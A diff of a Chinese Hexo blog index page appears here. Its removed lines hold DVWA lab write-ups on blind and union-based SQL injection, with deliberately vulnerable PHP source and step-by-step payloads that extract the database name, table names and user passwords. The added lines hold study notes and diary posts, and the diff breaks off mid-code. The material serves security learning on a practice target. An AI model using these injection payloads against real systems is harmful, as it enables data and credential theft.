-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># Don&#39;t need to do anything, protction handled on the client side</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-</script></p>
+        <p>大三上计组上课也没好好听课，老师给划的重点也和没划差不太多，只能硬着头皮来看书理解。这学期用的是还没出版的新教材，用的RISCV指令集。简单记录一下自己复习计组觉得重要的知识点。</p>
+        
+          <a class="article-more-a" href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/#more">more >></a>
+        
       
       
     
@@ -352,11 +328,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">计算机核心课程</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/XSS/XSS(DOM)/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/01/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/">展开全文 >></a>
         </p>
       
 
@@ -388,71 +375,30 @@
 
 
   
-    <article id="post-DVWA/分类详解/SQL Injection(Blind)/SQL injection(Blind)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-2020日记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection(Blind)/SQL%20injection(Blind)/">DVWA/分类详解/SQL Injection(Blind)/SQL injection(Blind)</a>
+      <a class="article-title" href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/">2020日记</a>
     </h1>
   
 
         
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection(Blind)/SQL%20injection(Blind)/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.765Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
+        <a href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2020-01-01T14:24:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><p>盲注分为基于布尔的盲注，基于时间的盲注和基于报错的盲注，盲注同样是因为输入的语句未经规范和过滤，造成了原有的sql语句结构改变，但不同与sql injection的是，盲注漏洞只能返回yes /no。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.判断是否存在注入，注入是字符型还是数字型</span><br><span class="line"></span><br><span class="line">2.猜解当前数据库名</span><br><span class="line"></span><br><span class="line">3.猜解数据库中的表名</span><br><span class="line"></span><br><span class="line">4.猜解表中的字段名</span><br><span class="line"></span><br><span class="line">5.猜解数据</span><br></pre></td></tr></table></figure>
-
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    $num &#x3D; @mysqli_num_rows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors</span><br><span class="line">    if( $num &gt; 0 ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t!</span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>审计可知，Low等级对输入没有做任何过滤，可以直接注入</p>
-<p>（以下yes代表返回为User ID exists in the database，no代表User ID is MISSING from the database)</p>
-<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>（1)判断注入点及注入类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1										#yes</span><br><span class="line">1&#39;										#no</span><br><span class="line">1 or 1&#x3D;1								#无显示</span><br><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1								#yes</span><br><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;#							#yes</span><br></pre></td></tr></table></figure>
-
-<p>证明存在字符型注入</p>
-<p>（2）猜数据库长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(database())&#x3D;1 #			#no</span><br><span class="line">1&#39; and length(database())&#x3D;2 #			#no</span><br><span class="line">1&#39; and length(database())&#x3D;3 #			#no</span><br><span class="line">1&#39; and length(database())&#x3D;4 #			#yes</span><br><span class="line">1&#39; and length(database())&#x3D;5 #			#no</span><br></pre></td></tr></table></figure>
-
-<p>证明数据库长度为4</p>
-<p>（3）猜数据库名（一个字母一个字母的来）</p>
-<p>二分法(推荐）或遍历</p>
-<p>最好利用python写脚本实现</p>
-<p>下列只展示yes过程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">遍历法</span><br><span class="line">1&#39; and substr(database(),1,1)&#x3D;&#39;d&#39;# 	</span><br><span class="line">1&#39; and substr(database(),2,1)&#x3D;&#39;v&#39;#</span><br><span class="line">1&#39; and substr(database(),3,1)&#x3D;&#39;w&#39;#</span><br><span class="line">1&#39; and substr(database(),4,1)&#x3D;&#39;v&#39;#</span><br><span class="line">二分法</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&lt;100 #</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;100 #</span><br><span class="line">1&#39; and ascii(substr(database(),2,1))&lt;118 #</span><br><span class="line">1&#39; and ascii(substr(database(),2,1))&gt;118 #</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&lt;119 #</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;119</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&lt;97 #</span><br><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;97 #</span><br></pre></td></tr></table></figure>
-
-<p>（4）猜表</p>
-<p>猜数量</p>
-<p>猜第1<del>n个表名长度+猜第1</del>n个表名</p>
-<p>（5）猜列</p>
-<p>猜列数</p>
-<p>猜1~n个列名长度+猜列名</p>
-<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>（1）判断注入是否存在及注入类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and sleep(5)#		#有明显延迟</span><br><span class="line">1 and sleep(5)#			#无延迟</span><br></pre></td></tr></table></figure>
-
-<p>（2）猜数据库名长度</p>
-<p>猜数据库名</p>
-<p>（3）猜表数</p>
-<p>猜1~n表名长度和表名</p>
-<p>（4）猜列数</p>
-<p>猜1~n列名长度和列名</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ];</span><br><span class="line">    $id &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    $num &#x3D; @mysqli_num_rows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors</span><br><span class="line">    if( $num &gt; 0 ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>限制了输入为下拉框，但可以通过抓包改参，因为是数字型注入，所以mysqli_real_escape_string没有用了</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_COOKIE[ &#39;id&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_COOKIE[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    $num &#x3D; @mysqli_num_rows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors</span><br><span class="line">    if( $num &gt; 0 ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Might sleep a random amount</span><br><span class="line">        if( rand( 0, 5 ) &#x3D;&#x3D; 3 ) &#123;</span><br><span class="line">            sleep( rand( 2, 4 ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t!</span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>企图限制长度为1,可以通过#给注释掉，同sql 注入</p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered?</span><br><span class="line">    if(is_numeric( $id )) &#123;</span><br><span class="line">        &#x2F;&#x2F; Check the database</span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; );</span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Get results</span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">            &#x2F;&#x2F; Feedback for end user</span><br><span class="line">            echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t!</span><br><span class="line">            header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user</span><br><span class="line">            echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
+        记录2020年的点点滴滴~
+        
+          <a class="article-more-a" href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/#more">more >></a>
+        
       
       
     
@@ -463,11 +409,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">随手小记</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection(Blind)/SQL%20injection(Blind)/">展开全文 >></a>
+          <a class="article-more-a" href="/2020/01/01/2020%E6%97%A5%E8%AE%B0/">展开全文 >></a>
         </p>
       
 
@@ -499,131 +456,30 @@
 
 
   
-    <article id="post-DVWA/分类详解/SQL Injection/SQL_Injection手注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Flag-for-2020" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/SQL_Injection%E6%89%8B%E6%B3%A8/">DVWA/分类详解/SQL Injection/SQL_Injection手注</a>
+      <a class="article-title" href="/2020/01/01/Flag-for-2020/">Flag-for-2020</a>
     </h1>
   
 
         
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/SQL%20Injection/SQL_Injection%E6%89%8B%E6%B3%A8/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.671Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
+        <a href="/2020/01/01/Flag-for-2020/" class="archive-article-date">
+  	<time datetime="2019-12-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.判断是否存在注入，注入是字符型还是数字型</span><br><span class="line"></span><br><span class="line">2.猜解SQL查询语句中的字段数</span><br><span class="line"></span><br><span class="line">3.确定显示的字段顺序</span><br><span class="line"></span><br><span class="line">4.获取当前数据库</span><br><span class="line"></span><br><span class="line">5.获取数据库中的表</span><br><span class="line"></span><br><span class="line">6.获取表中的字段名</span><br><span class="line"></span><br><span class="line">7.下载数据</span><br></pre></td></tr></table></figure>
-
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_REQUEST[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    while( $row &#x3D; mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get values</span><br><span class="line">        $first &#x3D; $row[&quot;first_name&quot;];</span><br><span class="line">        $last  &#x3D; $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Low级别没有进行任何的过滤与防御，可以直接进行SQL注入</p>
-<p>（1）判断是否存在注入及判断注入类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 							可以显示</span><br><span class="line">1&#39;							报错</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2 				查询结果为空</span><br><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1				所有结果全被列出</span><br></pre></td></tr></table></figure>
-
-<p>说明存在字符型注入</p>
-<p>（2）判断字段数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 10# 			#报错</span><br><span class="line">1’ order by 5#				#报错</span><br><span class="line">1&#39; order by 3#				#报错</span><br><span class="line">1’ order by 2#				#正常显示</span><br></pre></td></tr></table></figure>
-
-<p>说明存在两个字段</p>
-<p>（3）判断显示的字段顺序</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2 #					#测试显位情况</span><br></pre></td></tr></table></figure>
-
-<p>![1554441500161](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554441500161.png)</p>
-<p>（4）猜数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database() #			#猜数据库名</span><br></pre></td></tr></table></figure>
-
-<p>![1554441447771](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554441447771.png)</p>
-<p>数据库名为dvwa</p>
-<p>（5）猜表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; #</span><br></pre></td></tr></table></figure>
-
-<p>![1554442207282](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554442207282.png)</p>
-<p>得到数据库名为user和guestbook</p>
-<p>（6）猜列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br></pre></td></tr></table></figure>
-
-<p>![1554442511752](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554442511752.png)</p>
-<p>得到列名</p>
-<p>（7）下载数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select user,password from users #</span><br></pre></td></tr></table></figure>
-
-<p>![1554442879160](E:\网络空间信息安全\测试靶场\DVWA\分类详解\SQL Injection\assets\1554442879160.png)</p>
-<p>得到用户名和密码</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_POST[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    $id &#x3D; mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    while( $row &#x3D; mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Display values</span><br><span class="line">        $first &#x3D; $row[&quot;first_name&quot;];</span><br><span class="line">        $last  